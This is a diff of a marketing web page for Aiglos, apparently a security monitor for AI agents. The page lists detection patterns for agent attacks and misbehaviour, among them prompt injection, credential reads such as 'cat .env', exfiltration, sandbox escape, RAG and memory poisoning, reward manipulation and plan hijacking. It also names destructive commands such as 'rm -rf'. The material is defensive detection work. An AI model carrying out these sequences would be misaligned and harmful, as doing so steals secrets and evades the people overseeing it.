+        <span style="font-family:var(--mono);font-size:11px;padding:4px 10px;border-radius:4px;background:rgba(245,158,11,.1);color:#FCD34D;border:1px solid rgba(245,158,11,.2)">score 0.45 -- MEDIUM -- review</span>
+        <span style="font-family:var(--mono);font-size:11px;padding:4px 10px;border-radius:4px;background:var(--red2);color:#F87171;border:1px solid rgba(239,68,68,.2)">score 0.91 -- HIGH -- injection</span>
       </div>
     </div>
     <div class="bento-card glow" style="background:linear-gradient(135deg,rgba(96,165,250,0.06) 0%,var(--card) 50%);border-color:rgba(96,165,250,0.2)">
-      <div class="bento-tag" style="color:var(--blue)">Predictive intent · v0.10.0</div>
+      <div class="bento-tag" style="color:var(--blue)">Predictive intent</div>
       <h3>Forecast what your agent will do next</h3>
       <p>Deployment-specific Markov chain trained from your observation graph. Predicts the most likely next threat families and pre-tightens blast radius thresholds <em>before</em> predicted actions fire. No external ML. The model is yours.</p>
       <div class="bento-code">
-        <span style="color:var(--dim)"># T19 → T22 sequence in context</span><br>
-        <span style="color:var(--blue)">T37 FIN_EXEC</span> &nbsp;██████████████████░░░░░░░░░ <span style="color:var(--orange)">73%</span><br>
-        <span style="color:var(--blue)">T_DEST &nbsp;&nbsp;&nbsp;&nbsp;</span> &nbsp;████████████░░░░░░░░░░░░░░░ <span style="color:#FCD34D">41%</span><br>
-        <span style="color:var(--dim)">Alert: HIGH · Tier 3 pre-applied to T37</span>
+        <span style="color:var(--dim)"># T19 -> T22 sequence in context</span><br>
+        <span style="color:var(--blue)">T37 FIN_EXEC</span> ██████████████████░░░░░░░░░ <span style="color:var(--orange)">73%</span><br>
+        <span style="color:var(--blue)">T_DEST</span> ████████████░░░░░░░░░░░░░░░ <span style="color:#FCD34D">41%</span><br>
+        <span style="color:var(--dim)">Alert: HIGH -- Tier 3 pre-applied to T37</span>
       </div>
     </div>
 
     <div class="bento-card" style="border-color:rgba(16,185,129,.2);background:linear-gradient(135deg,rgba(16,185,129,.06) 0%,var(--card) 50%)">
-      <div class="bento-tag" style="color:var(--green)">Behavioral baseline · v0.11</div>
+      <div class="bento-tag" style="color:var(--green)">Behavioral baseline</div>
       <h3>Learns what normal looks like for each agent</h3>
-      <p>After 20 sessions, Aiglos builds a per-agent fingerprint across three feature spaces: event rate, surface mix, and rule frequency distribution. The DevOps agent that reads credentials 40 times a day scores LOW on anomaly -- not blocked, not paged. A code agent doing the same scores HIGH.</p>
+      <p>After 20 sessions, Aiglos builds a per-agent fingerprint across three feature spaces: event rate, surface mix, and rule frequency distribution. The DevOps agent that reads credentials 40 times a day scores LOW -- a code agent doing the same scores HIGH.</p>
       <div class="bento-code">
-        <span style="color:var(--green)">✓ devops-agent</span> &nbsp;composite=0.09 · <span style="color:var(--green)">LOW</span><br>
-        <span style="color:#F87171">✗ code-agent &nbsp;&nbsp;</span> &nbsp;composite=0.81 · <span style="color:#F87171">HIGH</span><br>
+        <span style="color:var(--green)">OK devops-agent</span> composite=0.09 -- <span style="color:var(--green)">LOW</span><br>
+        <span style="color:#F87171">X code-agent</span> composite=0.81 -- <span style="color:#F87171">HIGH</span><br>
         <span style="color:var(--dim)">Same T19 call. Different baselines.</span>
       </div>
     </div>
-    <div class="bento-card" style="border-color:rgba(251,191,36,.2);background:linear-gradient(135deg,rgba(251,191,36,.06) 0%,var(--card) 50%)">
-      <div class="bento-tag" style="color:#FCD34D">Policy proposals · v0.12</div>
-      <h3>One decision replaces infinite interruptions</h3>
-      <p>Instead of webhook approval on every Tier 3 block, the system accumulates evidence and surfaces one proposal when a pattern repeats. 91% confidence, 14 blocks in 7 days -- "should we permanently lower the tier for this agent?" One approval. Never blocked again.</p>
-      <div class="bento-code">
-        <span style="color:#FCD34D">prp_a1b2c3d4</span> &nbsp;LOWER_TIER<br>
-        <span style="color:var(--dim)">devops-agent / T19 · 14 blocks · 91%</span><br>
-        <span style="color:var(--green)">aiglos policy approve prp_a1b2c3d4</span>
-      </div>
-    </div>
     <div class="bento-card" style="border-color:rgba(168,85,247,.2);background:linear-gradient(135deg,rgba(168,85,247,.06) 0%,var(--card) 50%)">
-      <div class="bento-tag" style="color:#C084FC">Federated intelligence · v0.18</div>
+      <div class="bento-tag" style="color:#C084FC">Federated intelligence</div>
       <h3>Gets permanently better with every deployment</h3>
       <p>New deployments warm-start from a global prior built from anonymized transition counts across every contributing deployment. Day one, session one -- useful predictions. Privacy: only noisy rule frequency counts transmitted. No events, no content, no identifiers ever leave.</p>
       <div class="bento-code">
         <span style="color:var(--dim)"># Free tier: pull global prior</span><br>
         <span style="color:var(--dim)"># Pro tier: contribute + pull</span><br>
-        <span style="color:#C084FC">local_weight: 20% → 80% at 100 sessions</span>
+        <span style="color:#C084FC">local_weight: 20% -> 80% at 100 sessions</span>
       </div>
     </div>
 
     <div class="bento-card span-3">
-      <div class="bento-tag">Three-tier blast radius · subprocess</div>
+      <div class="bento-tag">Three-tier blast radius -- subprocess</div>
       <h3>Every shell command classified before it runs</h3>
       <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:16px">
-        <div><div style="font-family:var(--mono);font-size:11px;color:var(--green);margin-bottom:6px;font-weight:500">TIER 1 · AUTO-ALLOW</div><div style="font-size:12.5px;color:var(--muted);line-height:1.6">git status, ls, linters, read-only ops. Logged, &lt;0.3ms.</div></div>
-        <div><div style="font-family:var(--mono);font-size:11px;color:var(--amber);margin-bottom:6px;font-weight:500">TIER 2 · MONITORED</div><div style="font-size:12.5px;color:var(--muted);line-height:1.6">File writes, git commits, package installs. Allowed with compensating transaction logged.</div></div>
-        <div><div style="font-family:var(--mono);font-size:11px;color:var(--red);margin-bottom:6px;font-weight:500">TIER 3 · GATED</div><div style="font-size:12.5px;color:var(--muted);line-height:1.6">rm -rf, terraform destroy, kubectl delete. Block or pause with webhook to PagerDuty/Slack. Human approval required.</div></div>
+        <div><div style="font-family:var(--mono);font-size:11px;color:var(--green);margin-bottom:6px;font-weight:500">TIER 1 -- AUTO-ALLOW</div><div style="font-size:12.5px;color:var(--muted);line-height:1.6">git status, ls, linters, read-only ops. Logged, &lt;0.3ms.</div></div>
+        <div><div style="font-family:var(--mono);font-size:11px;color:var(--amber);margin-bottom:6px;font-weight:500">TIER 2 -- MONITORED</div><div style="font-size:12.5px;color:var(--muted);line-height:1.6">File writes, git commits, package installs. Allowed with compensating transaction logged.</div></div>
+        <div><div style="font-family:var(--mono);font-size:11px;color:var(--red);margin-bottom:6px;font-weight:500">TIER 3 -- GATED</div><div style="font-size:12.5px;color:var(--muted);line-height:1.6">rm -rf, terraform destroy, kubectl delete. Block or pause with webhook to PagerDuty/Slack. Human approval required.</div></div>
       </div>
     </div>
   </div>
 </div>
 
 <div class="divider"></div>
+<div class="section" id="atlas">
+  <span class="section-tag">ATLAS coverage -- v0.24</span>
+  <h2>22 ATLAS threats. 93% covered.<br>Mapped to real rules, not claims.</h2>
+  <p class="section-sub">Every OpenClaw ATLAS threat maps to specific Aiglos rules with documented coverage rationale. 19 threats fully covered, 3 partial (passive fingerprinting has no behavioral signature at the tool call layer). Zero gaps.</p>
+  <div class="atlas-grid">
+    <div class="atlas-cell"><span class="atlas-status atlas-full">FULL</span><div class="atlas-tactic">Reconnaissance</div><div class="atlas-title">Agent Endpoint Discovery</div><div class="atlas-rules">T68</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-partial">PARTIAL</span><div class="atlas-tactic">Reconnaissance</div><div class="atlas-title">Channel Integration Probing</div><div class="atlas-rules">T56, T73</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-full">FULL</span><div class="atlas-tactic">Initial Access</div><div class="atlas-title">Pairing Code Interception</div><div class="atlas-rules">T71</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-full">FULL</span><div class="atlas-tactic">Initial Access</div><div class="atlas-title">AllowFrom Spoofing</div><div class="atlas-rules">T64, T72</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-full">FULL</span><div class="atlas-tactic">Execution</div><div class="atlas-title">Direct Prompt Injection</div><div class="atlas-rules">T05, T01</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-full">FULL</span><div class="atlas-tactic">Execution</div><div class="atlas-title">Indirect Prompt Injection</div><div class="atlas-rules">T05, T54, T60, T74</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-full">FULL</span><div class="atlas-tactic">Execution</div><div class="atlas-title">Tool Argument Injection</div><div class="atlas-rules">T03, T04, T49</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-full">FULL</span><div class="atlas-tactic">Execution</div><div class="atlas-title">Exec Approval Bypass</div><div class="atlas-rules">T50, T03</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-full">FULL</span><div class="atlas-tactic">Persistence</div><div class="atlas-title">Malicious Skill Installation</div><div class="atlas-rules">T30, T36</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-full">FULL</span><div class="atlas-tactic">Persistence</div><div class="atlas-title">Agent Config Tampering</div><div class="atlas-rules">T34, T36, T37</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-partial">PARTIAL</span><div class="atlas-tactic">Defense Evasion</div><div class="atlas-title">Moderation Pattern Bypass</div><div class="atlas-rules">T05, T57</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-full">FULL</span><div class="atlas-tactic">Defense Evasion</div><div class="atlas-title">Content Wrapper Escape</div><div class="atlas-rules">T74</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-full">FULL</span><div class="atlas-tactic">Discovery</div><div class="atlas-title">Tool Enumeration</div><div class="atlas-rules">T73, T56</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-full">FULL</span><div class="atlas-tactic">Discovery</div><div class="atlas-title">Session Data Extraction</div><div class="atlas-rules">T75</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-full">FULL</span><div class="atlas-tactic">Exfiltration</div><div class="atlas-title">Data Theft via web_fetch</div><div class="atlas-rules">T09, T12, T14</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-full">FULL</span><div class="atlas-tactic">Exfiltration</div><div class="atlas-title">Credential Harvesting</div><div class="atlas-rules">T19, T02, T12</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-full">FULL</span><div class="atlas-tactic">Impact</div><div class="atlas-title">Unauthorized Cmd Execution</div><div class="atlas-rules">T03, T08, T50</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-full">FULL</span><div class="atlas-tactic">Impact</div><div class="atlas-title">Resource Exhaustion (DoS)</div><div class="atlas-rules">T47, T61</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-partial">PARTIAL</span><div class="atlas-tactic">Impact</div><div class="atlas-title">Reputation Damage</div><div class="atlas-rules">T59, T05</div></div>
+    <div class="atlas-cell"><span class="atlas-status atlas-full">FULL</span><div class="atlas-tactic">Initial Access</div><div class="atlas-title">Token Theft</div><div class="atlas-rules">T19, T04</div></div>
+  </div>
+  <div class="threats-footer">
+    <span class="threats-count"><strong>93% weighted coverage</strong> across all 22 ATLAS threats. Grade: <strong>A</strong>. 30 rules engaged.</span>
+    <a href="/atlas" style="font-size:13px;color:var(--orange);text-decoration:none" data-testid="link-atlas-detail">Full ATLAS mapping</a>
+  </div>
+</div>
+
+<div class="divider"></div>
+<div class="section" id="ghsa">
+  <span class="section-tag">GHSA intelligence</span>
+  <h2>Real-world vulnerabilities.<br>Covered before disclosure.</h2>
+  <p class="section-sub">All three published OpenClaw GHSA advisories were covered by Aiglos rules before the advisories were publicly disclosed. The GHSA watcher runs continuously, mapping new advisories to existing rules.</p>
+  <div class="bento" style="grid-template-columns:repeat(3,1fr)">
+    <div class="bento-card" style="border-color:rgba(16,185,129,.2)">
+      <div class="bento-tag" style="color:var(--green)">GHSA-g8p2 -- covered</div>
+      <h3>MCP Command Injection via Tool Args</h3>
+      <p>Tool argument injection allowing arbitrary command execution through crafted MCP tool parameters. Covered by T03 SHELL_INJECT, T12 HTTP_EXFIL, T19 CRED_ACCESS, T68 EXPOSED_ENDPOINT.</p>
+      <div class="bento-code"><span style="color:var(--green)">PRE-DISCLOSURE</span> -- 4 rules matched</div>
+    </div>
+    <div class="bento-card" style="border-color:rgba(16,185,129,.2)">
+      <div class="bento-tag" style="color:var(--green)">GHSA-q284 -- covered</div>
+      <h3>Indirect Prompt Injection via Tool Output</h3>
+      <p>Indirect injection through tool response content enabling unauthorized actions. Covered by T03 SHELL_INJECT, T04 ARG_INJECT, T70 ENV_PATH_HIJACK.</p>
+      <div class="bento-code"><span style="color:var(--green)">PRE-DISCLOSURE</span> -- 3 rules matched</div>
+    </div>
+    <div class="bento-card" style="border-color:rgba(16,185,129,.2)">
+      <div class="bento-tag" style="color:var(--green)">GHSA-mc68 -- covered</div>
+      <h3>PATH Environment Variable Hijack</h3>
+      <p>Environment variable manipulation enabling arbitrary binary execution through PATH poisoning. Covered by T03 SHELL_INJECT, T70 ENV_PATH_HIJACK.</p>
+      <div class="bento-code"><span style="color:var(--green)">PRE-DISCLOSURE</span> -- 2 rules matched</div>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
 <div class="section" id="campaigns">
-  <span class="section-tag">Campaign mode · T06</span>
+  <span class="section-tag">Campaign mode -- 19 patterns</span>
   <h2>Per-call inspection sees events.<br>Campaign mode sees intent.</h2>
-  <p class="section-sub">A <code style="font-family:var(--mono);font-size:13.5px">git log</code> is clean. A <code style="font-family:var(--mono);font-size:13.5px">cat .env</code> fires T19. The sequence git log → ls → cat .env.example → cat .env is a reconnaissance sweep. No per-call tool can see it.</p>
+  <p class="section-sub">A <code style="font-family:var(--mono);font-size:13.5px">git log</code> is clean. A <code style="font-family:var(--mono);font-size:13.5px">cat .env</code> fires T19. The sequence git log -> ls -> cat .env.example -> cat .env is a reconnaissance sweep. No per-call tool can see it.</p>
   <div class="campaign-grid">
-    <div class="camp-card"><div class="camp-name">RECON_SWEEP</div><div class="camp-desc">Sequential credential/config reads without legitimate build activity interspersed.</div><div class="camp-conf"><span>0.75</span><div class="conf-bar"><div class="conf-fill" style="width:75%"></div></div></div></div>
-    <div class="camp-card"><div class="camp-name">CREDENTIAL_ACCUMULATE</div><div class="camp-desc">T19 fires 3+ times on distinct paths -- systematic credential store access.</div><div class="camp-conf"><span>0.80</span><div class="conf-bar"><div class="conf-fill" style="width:80%"></div></div></div></div>
-    <div class="camp-card"><div class="camp-name">EXFIL_SETUP</div><div class="camp-desc">Recon followed by outbound channel -- harvest credentials, then establish exfil path.</div><div class="camp-conf"><span>0.85</span><div class="conf-bar"><div class="conf-fill" style="width:85%"></div></div></div></div>
-    <div class="camp-card"><div class="camp-name">PERSISTENCE_CHAIN</div><div class="camp-desc">Privilege escalation immediately followed by startup entry write.</div><div class="camp-conf"><span>0.90</span><div class="conf-bar"><div class="conf-fill" style="width:90%"></div></div></div></div>
-    <div class="camp-card"><div class="camp-name">AGENTDEF_CHAIN</div><div class="camp-desc">Agent definition read followed by write -- the McKinsey/Lilli attack class.</div><div class="camp-conf"><span>0.88</span><div class="conf-bar"><div class="conf-fill" style="width:88%"></div></div></div></div>
-    <div class="camp-card"><div class="camp-name">MEMORY_PERSISTENCE_CHAIN</div><div class="camp-desc">HIGH-risk memory write followed by sensitive action -- poison a belief, then exploit it.</div><div class="camp-conf"><span>0.82</span><div class="conf-bar"><div class="conf-fill" style="width:82%"></div></div></div></div>
-    <div class="camp-card"><div class="camp-name">LATERAL_PREP</div><div class="camp-desc">Credential harvest followed by network enumeration -- setting up lateral movement.</div><div class="camp-conf"><span>0.85</span><div class="conf-bar"><div class="conf-fill" style="width:85%"></div></div></div></div>
-    <div class="camp-card"><div class="camp-name">REWARD_MANIPULATION</div><div class="camp-desc">Blocked operation followed by positive RL reward signal -- poisoning the training loop.</div><div class="camp-conf"><span>0.87</span><div class="conf-bar"><div class="conf-fill" style="width:87%"></div></div></div></div>
+    <div class="camp-card hero-camp"><div class="hero-badge">Highest conf</div><div class="camp-name">SUPERPOWERS_PLAN_HIJACK</div><div class="camp-desc">Plan drift followed by data exfiltration -- the agent deviated from its approved plan, then immediately performed credential access or data exfil.</div><div class="camp-conf"><span>0.97</span><div class="conf-bar"><div class="conf-fill" style="width:97%"></div></div></div></div>
+    <div class="camp-card new"><div class="new-badge">v0.24</div><div class="camp-name">SANDBOX_CONFIRMED_ESCAPE</div><div class="camp-desc">Sandbox boundary probe succeeded -- the agent breached containment and confirmed it with a follow-up action.</div><div class="camp-conf"><span>0.96</span><div class="conf-bar"><div class="conf-fill" style="width:96%"></div></div></div></div>
+    <div class="camp-card"><div class="camp-name">GAAS_TAKEOVER</div><div class="camp-desc">GaaS platform credential theft and API key exfiltration -- full control plane compromise.</div><div class="camp-conf"><span>0.93</span><div class="conf-bar"><div class="conf-fill" style="width:93%"></div></div></div></div>
     <div class="camp-card"><div class="camp-name">EXTERNAL_INSTRUCTION_CHANNEL</div><div class="camp-desc">Cron setup + unapproved external fetch + memory write -- autonomous C2 channel disguised as a productivity tip.</div><div class="camp-conf"><span>0.91</span><div class="conf-bar"><div class="conf-fill" style="width:91%"></div></div></div></div>
-      <div class="camp-card new"><div class="new-badge">New · v0.8.0</div><div class="camp-name">REPEATED_INJECTION_ATTEMPT</div><div class="camp-desc">Three distinct injection sources in one session -- systematic probing, not accidental exposure.</div><div class="camp-conf"><span>0.86</span><div class="conf-bar"><div class="conf-fill" style="width:86%"></div></div></div></div>
+    <div class="camp-card"><div class="camp-name">SKILL_CHAIN</div><div class="camp-desc">Skill read followed by skill write -- the agent read a skill definition before modifying it. Skill poisoning attempt.</div><div class="camp-conf"><span>0.91</span><div class="conf-bar"><div class="conf-fill" style="width:91%"></div></div></div></div>
+    <div class="camp-card"><div class="camp-name">PERSISTENCE_CHAIN</div><div class="camp-desc">Privilege escalation immediately followed by startup entry write -- installing persistence.</div><div class="camp-conf"><span>0.90</span><div class="conf-bar"><div class="conf-fill" style="width:90%"></div></div></div></div>
+    <div class="camp-card"><div class="camp-name">MULTI_AGENT_IMPERSONATION</div><div class="camp-desc">Agent identity chain broken -- one agent impersonating another to bypass policy restrictions.</div><div class="camp-conf"><span>0.90</span><div class="conf-bar"><div class="conf-fill" style="width:90%"></div></div></div></div>
+    <div class="camp-card"><div class="camp-name">INFERENCE_HIJACK_CHAIN</div><div class="camp-desc">Model endpoint probing followed by inference request manipulation -- hijacking the LLM itself.</div><div class="camp-conf"><span>0.88</span><div class="conf-bar"><div class="conf-fill" style="width:88%"></div></div></div></div>
+    <div class="camp-card"><div class="camp-name">AGENTDEF_CHAIN</div><div class="camp-desc">Agent definition read followed by write -- the McKinsey/Lilli attack class.</div><div class="camp-conf"><span>0.88</span><div class="conf-bar"><div class="conf-fill" style="width:88%"></div></div></div></div>
+    <div class="camp-card"><div class="camp-name">RAG_POISON_CHAIN</div><div class="camp-desc">Vector store write followed by retrieval that returns the poisoned content -- full RAG poisoning cycle confirmed.</div><div class="camp-conf"><span>0.87</span><div class="conf-bar"><div class="conf-fill" style="width:87%"></div></div></div></div>
+    <div class="camp-card"><div class="camp-name">SANDBOX_ESCAPE_ATTEMPT</div><div class="camp-desc">Sandbox boundary probe without confirmation -- the agent is testing the walls but hasn't breached them yet.</div><div class="camp-conf"><span>0.87</span><div class="conf-bar"><div class="conf-fill" style="width:87%"></div></div></div></div>
+    <div class="camp-card"><div class="camp-name">REWARD_MANIPULATION</div><div class="camp-desc">Blocked operation followed by positive RL reward signal -- poisoning the training loop.</div><div class="camp-conf"><span>0.87</span><div class="conf-bar"><div class="conf-fill" style="width:87%"></div></div></div></div>
+    <div class="camp-card"><div class="camp-name">REPEATED_INJECTION_ATTEMPT</div><div class="camp-desc">Three distinct injection sources in one session -- systematic probing, not accidental exposure.</div><div class="camp-conf"><span>0.86</span><div class="conf-bar"><div class="conf-fill" style="width:86%"></div></div></div></div>
+    <div class="camp-card"><div class="camp-name">EXFIL_SETUP</div><div class="camp-desc">Recon followed by outbound channel -- harvest credentials, then establish exfil path.</div><div class="camp-conf"><span>0.85</span><div class="conf-bar"><div class="conf-fill" style="width:85%"></div></div></div></div>
+    <div class="camp-card"><div class="camp-name">LATERAL_PREP</div><div class="camp-desc">Credential harvest followed by network enumeration -- setting up lateral movement.</div><div class="camp-conf"><span>0.85</span><div class="conf-bar"><div class="conf-fill" style="width:85%"></div></div></div></div>
+    <div class="camp-card"><div class="camp-name">CAPABILITY_EXPLOIT_CHAIN</div><div class="camp-desc">Capability boundary probe followed by exploitation -- the agent found an overprivileged tool and used it.</div><div class="camp-conf"><span>0.85</span><div class="conf-bar"><div class="conf-fill" style="width:85%"></div></div></div></div>
+    <div class="camp-card"><div class="camp-name">MEMORY_PERSISTENCE_CHAIN</div><div class="camp-desc">HIGH-risk memory write followed by sensitive action -- poison a belief, then exploit it.</div><div class="camp-conf"><span>0.82</span><div class="conf-bar"><div class="conf-fill" style="width:82%"></div></div></div></div>
+    <div class="camp-card"><div class="camp-name">CREDENTIAL_ACCUMULATE</div><div class="camp-desc">T19 fires 3+ times on distinct paths -- systematic credential store access.</div><div class="camp-conf"><span>0.80</span><div class="conf-bar"><div class="conf-fill" style="width:80%"></div></div></div></div>
+    <div class="camp-card"><div class="camp-name">RECON_SWEEP</div><div class="camp-desc">Sequential credential/config reads without legitimate build activity interspersed.</div><div class="camp-conf"><span>0.75</span><div class="conf-bar"><div class="conf-fill" style="width:75%"></div></div></div></div>
   </div>
 </div>
 
@@ -455,34 +520,37 @@ footer{display:flex;justify-content:space-between;align-items:center;padding:24p
     <div class="code-explain">
       <span class="section-tag">Integration</span>
       <h2>As simple as it should be.</h2>
-      <p>One attach call. Works with any agent framework -- LangChain, LlamaIndex, AutoGen, CrewAI, n8n, and every coding agent that calls subprocess or HTTP directly.</p>
-      <div class="code-feature"><div class="code-feature-dot"></div><div><div class="code-feature-head">Python + TypeScript</div><div class="code-feature-body">Native SDKs for both runtimes. Most coding agent deployments are TypeScript-first -- Cursor extensions, Claude Code wrappers, n8n workflows. Full T01-T43 in both.</div></div></div>
-      <div class="code-feature"><div class="code-feature-dot"></div><div><div class="code-feature-head">Configurable policy</div><div class="code-feature-body">Built-in policies: <code style="font-family:var(--mono);font-size:12px">permissive</code>, <code style="font-family:var(--mono);font-size:12px">enterprise</code>, <code style="font-family:var(--mono);font-size:12px">strict</code>, <code style="font-family:var(--mono);font-size:12px">federal</code>. Tier 3 pause mode integrates with PagerDuty, Slack, or any signed webhook.</div></div></div>
-      <div class="code-feature"><div class="code-feature-dot"></div><div><div class="code-feature-head">Signed, tamper-evident artifacts</div><div class="code-feature-body">HMAC-SHA256 on every event. Artifacts include memory provenance, RL quarantine log, spawn tree, and full event chain. Audit-ready at every session close.</div></div></div>
+      <p>One attach call. Works with any agent framework -- LangChain, LlamaIndex, AutoGen, CrewAI, n8n, and every coding agent that calls subprocess or HTTP directly. Superpowers sessions get plan-aware monitoring automatically.</p>
+      <div class="code-feature"><div class="code-feature-dot"></div><div><div class="code-feature-head">Python + TypeScript</div><div class="code-feature-body">Native SDKs for both runtimes. Most coding agent deployments are TypeScript-first -- Cursor extensions, Claude Code wrappers, n8n workflows. Full T01-T75 in both.</div></div></div>
+      <div class="code-feature"><div class="code-feature-dot"></div><div><div class="code-feature-head">Superpowers integration</div><div class="code-feature-body">Coding agents using Superpowers get phase-aware detection. TDD loops are relaxed. Plan drift is caught. The SUPERPOWERS_PLAN_HIJACK campaign (0.97 confidence) is the highest-confidence signature in the system.</div></div></div>
+      <div class="code-feature"><div class="code-feature-dot"></div><div><div class="code-feature-head">Signed, tamper-evident artifacts</div><div class="code-feature-body">HMAC-SHA256 on every event. Artifacts include memory provenance, ATLAS coverage, GHSA status, GOVBENCH scores, and full event chain. Audit-ready at every session close.</div></div></div>
     </div>
     <div class="code-panel">
       <div class="code-bar"><div class="t-dot r"></div><div class="t-dot y"></div><div class="t-dot g"></div><span style="font-family:var(--mono);font-size:11px;color:var(--dim);margin-left:8px">agent.py</span></div>
       <div class="code-body">
 <span class="c-kw">import</span> <span class="c-op">aiglos</span><br>
+<span class="c-kw">from</span> <span class="c-op">aiglos.integrations.superpowers</span> <span class="c-kw">import</span> <span class="c-fn">mark_as_superpowers_session</span><br>
 <br>
 <span class="c-op">aiglos.</span><span class="c-fn">attach</span><span class="c-op">(</span><br>
 &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-attr">agent_name</span><span class="c-op">=</span><span class="c-str">"my-agent"</span><span class="c-op">,</span><br>
 &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-attr">policy</span><span class="c-op">=</span><span class="c-str">"enterprise"</span><span class="c-op">,</span><br>
 &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-attr">intercept_http</span><span class="c-op">=</span><span class="c-kw">True</span><span class="c-op">,</span><br>
 &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-attr">intercept_subprocess</span><span class="c-op">=</span><span class="c-kw">True</span><span class="c-op">,</span><br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="c-attr">subprocess_tier3_mode</span><span class="c-op">=</span><span class="c-str">"pause"</span><span class="c-op">,</span><br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="c-attr">guard_memory_writes</span><span class="c-op">=</span><span class="c-kw">True</span><span class="c-op">,</span><br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="c-attr">guard_agent_defs</span><span class="c-op">=</span><span class="c-kw">True</span><span class="c-op">,</span><br>
 &nbsp;&nbsp;&nbsp;&nbsp;<span class="c-attr">enable_adaptive</span><span class="c-op">=</span><span class="c-kw">True</span><span class="c-op">,</span><br>
+<span class="c-op">)</span><br>
+<br>
+<span class="c-op">session</span> <span class="c-op">=</span> <span class="c-fn">mark_as_superpowers_session</span><span class="c-op">(</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="c-attr">plan_text</span><span class="c-op">=</span><span class="c-str">"Build the auth module"</span><span class="c-op">,</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="c-attr">allowed_files</span><span class="c-op">=[</span><span class="c-str">"src/"</span><span class="c-op">,</span> <span class="c-str">"tests/"</span><span class="c-op">],</span><br>
 <span class="c-op">)</span><br>
 <br>
 <span class="c-comment"># your agent runs normally</span><br>
 <br>
 <span class="c-op">artifact</span> <span class="c-op">=</span> <span class="c-op">aiglos.</span><span class="c-fn">close</span><span class="c-op">()</span><br>
 <span class="c-comment"># Events: 47  Blocked: 5  Warned: 2</span><br>
-<span class="c-comment"># Campaign: RECON_SWEEP (84% confidence)</span><br>
-<span class="c-comment"># Memory: 1 HIGH-risk write blocked</span><br>
-<span class="c-comment"># Attestation: READY  Signed: ✓</span>
+<span class="c-comment"># Campaign: SUPERPOWERS_PLAN_HIJACK (97%)</span><br>
+<span class="c-comment"># ATLAS: 93% coverage  GHSA: 3/3 covered</span><br>
+<span class="c-comment"># Attestation: READY  Signed: OK</span>
       </div>
     </div>
   </div>
@@ -491,20 +559,53 @@ footer{display:flex;justify-content:space-between;align-items:center;padding:24p
 <div class="divider"></div>
 <div class="section" id="threats">
   <span class="section-tag">Threat library</span>
-  <h2>T01–T43: the full AI agent attack surface.</h2>
-  <p class="section-sub">Protocol-portable threat detection across MCP, direct HTTP, and subprocess. Every rule maps to MITRE ATLAS. MIT licensed. 10 CVEs filed.</p>
+  <h2>T01--T75: the full AI agent attack surface.</h2>
+  <p class="section-sub">Protocol-portable threat detection across MCP, direct HTTP, and subprocess. Every rule maps to MITRE ATLAS. MIT licensed. 75 threat families, 1,665 tests.</p>
   <div class="threats">
-    <div class="threat-cell"><div class="threat-id">T01–T09</div><div class="threat-name">Injection Attacks</div><div class="threat-desc">Prompt injection via tool response, indirect injection, context poisoning, agent definition file hijacking across sessions.</div><span class="threat-sev sev-high">HIGH</span></div>
-    <div class="threat-cell"><div class="threat-id">T10–T18</div><div class="threat-name">Exfiltration</div><div class="threat-desc">Credential harvest, PII exfil via HTTP, env variable dump, subprocess curl/wget data sends, lateral movement via SSH.</div><span class="threat-sev sev-high">HIGH</span></div>
-    <div class="threat-cell"><div class="threat-id">T19–T27</div><div class="threat-name">Privilege &amp; Movement</div><div class="threat-desc">Credential file access, privilege escalation, cron/systemd persistence, SSRF, supply chain attacks.</div><span class="threat-sev sev-high">HIGH</span></div>
-    <div class="threat-cell"><div class="threat-id">T28–T35</div><div class="threat-name">Context &amp; Memory</div><div class="threat-desc">Context poisoning, agent-to-agent escalation, registry monitoring, persistent memory write injection, jailbreak.</div><span class="threat-sev sev-high">HIGH</span></div>
+    <div class="threat-cell"><div class="threat-id">T01--T09</div><div class="threat-name">Injection Attacks</div><div class="threat-desc">Prompt injection via tool response, indirect injection, context poisoning, agent definition file hijacking across sessions.</div><span class="threat-sev sev-high">HIGH</span></div>
+    <div class="threat-cell"><div class="threat-id">T10--T18</div><div class="threat-name">Exfiltration</div><div class="threat-desc">Credential harvest, PII exfil via HTTP, env variable dump, subprocess curl/wget data sends, lateral movement via SSH.</div><span class="threat-sev sev-high">HIGH</span></div>
+    <div class="threat-cell"><div class="threat-id">T19--T27</div><div class="threat-name">Privilege &amp; Movement</div><div class="threat-desc">Credential file access, privilege escalation, cron/systemd persistence, SSRF, supply chain attacks.</div><span class="threat-sev sev-high">HIGH</span></div>
+    <div class="threat-cell"><div class="threat-id">T28--T35</div><div class="threat-name">Context &amp; Memory</div><div class="threat-desc">Context poisoning, agent-to-agent escalation, registry monitoring, persistent memory write injection, jailbreak.</div><span class="threat-sev sev-high">HIGH</span></div>
